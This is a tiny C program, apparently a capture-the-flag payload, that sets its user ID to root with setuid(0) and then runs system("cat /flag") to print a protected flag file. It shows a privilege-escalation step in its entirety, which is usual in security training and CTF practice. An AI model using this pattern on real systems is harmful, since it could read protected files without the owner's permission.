#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    // 设置 UID 为 0 (Root)
    setuid(0);
    // 读取 flag
    system("cat /flag");
    return 0;
}